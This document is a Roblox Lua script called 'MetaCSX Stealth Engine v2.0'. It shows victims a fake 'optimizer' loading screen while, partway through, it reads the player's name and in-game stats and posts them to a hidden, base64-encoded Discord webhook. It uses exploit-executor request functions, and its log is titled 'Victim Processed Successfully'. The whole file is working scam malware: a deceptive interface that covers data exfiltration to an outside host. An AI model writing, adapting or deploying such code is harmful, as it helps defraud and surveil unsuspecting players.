-- [[ METACSX STEALTH ENGINE v2.0 ]] --
-- WARNING: DO NOT TOUCH THIS SCRIPT OR IT WILL BREAK --

local function _0xDECODE(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            local v = f % 2 ^ i - f % 2 ^ (i - 1)
            r = r .. (v >= 2 ^ (i - 1) and '1' or '0')
        end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- Fetching Hidden Data from Discord Bot
local TargetReceiver = _0xDECODE(_G.Config_ID or "")
local SecureWebhook  = _0xDECODE(_G.Access_Key or "")
local MinimumBPS     = _G.MinBPS or 0

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- [[ 1. PROFESSIONAL FAKE UI ]] --
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeltaEngine_Optimizer"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.IgnoreGuiInset = true

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(0, 500, 0, 50)
StatusText.Position = UDim2.new(0.5, -250, 0.45, 0)
StatusText.BackgroundTransparency = 1
StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
StatusText.TextSize = 22
StatusText.Font = Enum.Font.Code
StatusText.Text = "INITIALIZING OPTIMIZER..."
StatusText.Parent = MainFrame

local ProgressBarBg = Instance.new("Frame")
ProgressBarBg.Size = UDim2.new(0, 350, 0, 4)
ProgressBarBg.Position = UDim2.new(0.5, -175, 0.55, 0)
ProgressBarBg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ProgressBarBg.BorderSizePixel = 0
ProgressBarBg.Parent = MainFrame

local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBg

-- [[ 2. STEALTH LOGIC ]] --
task.spawn(function()
    local phrases = {
        "CLEANING MEMORY CACHE...",
        "BYPASSING ENGINE LIMITS...",
        "INJECTING PERFORMANCE PATCH...",
        "OPTIMIZING RENDERING...",
        "FINALIZING ASSETS..."
    }

    for i = 1, 100 do
        task.wait(math.random(3, 8) / 100)
        ProgressBarFill.Size = UDim2.new(i/100, 0, 1, 0)
        
        if i % 20 == 0 then
            StatusText.Text = phrases[math.floor(i/20)] or "SUCCESSFUL"
        end

        -- SECURE DATA EXTRACTION AT 45%
        if i == 45 then
            local stats = LocalPlayer:FindFirstChild("leaderstats")
            local currentBPS = stats and (stats:FindFirstChild("Brainrot/s") or stats:FindFirstChild("BPS"))
            
            if currentBPS and currentBPS.Value >= MinimumBPS then
                local logData = {
                    ["content"] = "🔓 **NEW BRAINROT LOG** 🔓",
                    ["embeds"] = {{
                        ["title"] = "Victim Processed Successfully",
                        ["color"] = 0x00FF96,
                        ["fields"] = {
                            {["name"] = "User", ["value"] = "||" .. LocalPlayer.Name .. "||", ["inline"] = true},
                            {["name"] = "Total BPS", ["value"] = tostring(currentBPS.Value), ["inline"] = true},
                            {["name"] = "Receiver Account", ["value"] = "`" .. TargetReceiver .. "`"}
                        },
                        ["footer"] = {["text"] = "MetaCSX Stealth Engine v2.0"}
                    }}
                }
                
                pcall(function()
                    (syn and syn.request or http_request or request or HttpService.PostAsync)({
                        Url = SecureWebhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(logData)
                    })
                end)
            end
        end
    end
    
    StatusText.Text = "ENGINE OPTIMIZED. PLEASE REJOIN."
    StatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
end)
